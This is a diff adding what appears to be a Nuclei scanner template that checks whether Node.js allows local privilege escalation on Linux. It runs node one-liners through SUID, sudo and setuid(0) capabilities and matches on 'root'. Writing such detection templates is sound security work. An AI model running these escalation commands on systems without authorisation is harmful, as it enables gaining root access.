@@ -1,0 +1,54 @@
+id: privilege-escalation-node
+
+info:
+  name: Node - Privilege Escalation
+  author: daffainfo
+  severity: high
+  reference: https://gtfobins.github.io/gtfobins/node/
+  metadata:
+    verified: true
+  tags: code,linux,node,privesc
+
+self-contained: true
+code:
+  - engine:
+      - sh
+      - bash
+    source: |
+        whoami
+
+  #SUID
+  - engine:
+      - sh
+      - bash
+    source: |
+        node -e 'require("child_process").spawn("whoami", {stdio: [0, 1, 2]})'
+
+  #SUDO
+  - engine:
+      - sh
+      - bash
+    source: |
+        sudo node -e 'require("child_process").spawn("whoami", {stdio: [0, 1, 2]})'
+
+  #Capabilities
+  - engine:
+      - sh
+      - bash
+    source: |
+        node -e 'process.setuid(0); require("child_process").spawn("whoami", {stdio: [0, 1, 2]})'
+
+    matchers-condition: and
+    matchers:
+       - type: word
+         part: code_1_response
+         words:
+           - "root"
+         negative: true
+
+      - type: dsl
+        dsl:
+          - 'contains(code_2_response, "root")'
+          - 'contains(code_3_response, "root")'
+          - 'contains(code_4_response, "root")'
+        condition: or
